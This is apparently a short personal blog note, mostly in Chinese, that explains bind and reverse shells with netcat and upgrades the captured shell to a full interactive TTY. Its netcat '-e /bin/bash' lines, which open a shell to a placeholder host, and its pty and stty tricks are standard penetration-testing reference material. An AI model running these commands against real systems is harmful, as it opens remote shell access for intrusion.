---
title: "Reverse shell"
categories:
  - Blog
tags:
  - Bash
  - Reverse
last_modified_at: 2023-11-30
---

# Reverse shell

先弹 shell 就是正向 shell，后连接
后弹 shell 就是反向 shell，先监听

## 正向 shell

```bash
# 服务器端监听 1234 端口
nc -lvp 1234 -e /bin/bash
# 客户端连接 1234 端口
nc server_ip 1234
```

## 反向 shell

```bash
# 服务器端监听 1234 端口
nc -lvp 1234
# 客户端连接 1234 端口
nc server_ip 1234 -e /bin/bash
```

## interactive shell

- fix tty

```bash
# script command 用于记录终端会话
/usr/bin/script -qc /bin/bash /dev/null
# -q quiet
# -c command
```

or

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

```

- fix tty type char

```bash
# ctrl+z
stty raw -echo; fg
# <CR><CR>
```

- fix tty size

```bash
# get client tty size
stty -a
# set server tty size
export TERM=xterm-256color
stty rows 24 columns 80
```
